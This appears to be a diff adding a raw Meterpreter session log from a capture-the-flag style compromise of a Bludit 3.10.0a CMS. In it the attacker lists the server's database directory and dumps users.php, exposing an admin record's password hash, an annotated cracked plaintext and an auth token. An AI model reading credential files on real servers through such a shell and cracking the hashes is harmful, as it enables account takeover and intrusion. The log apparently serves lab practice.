@@ -1,0 +1,39 @@
+lmeterpreter > ls
+Listing: /var/www/bludit-3.10.0a/bl-content/databases
+=====================================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100644/rw-r--r--  438    fil   2020-05-19 05:03:34 -0400  categories.php
+100644/rw-r--r--  3437   fil   2020-05-19 05:03:34 -0400  pages.php
+40755/rwxr-xr-x   4096   dir   2020-05-19 05:03:34 -0400  plugins
+100644/rw-r--r--  42844  fil   2020-05-19 05:03:34 -0400  security.php
+100644/rw-r--r--  1319   fil   2020-05-19 05:03:34 -0400  site.php
+100644/rw-r--r--  2276   fil   2020-05-19 05:03:34 -0400  syslog.php
+100644/rw-r--r--  52     fil   2020-05-19 05:03:34 -0400  tags.php
+100644/rw-r--r--  597    fil   2020-05-19 05:10:13 -0400  users.php
+
+meterpreter > cat users.php
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",  --> Password120 faca404fd5c0a31cf1897b823c695c85cffeb98d
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+}
+
+
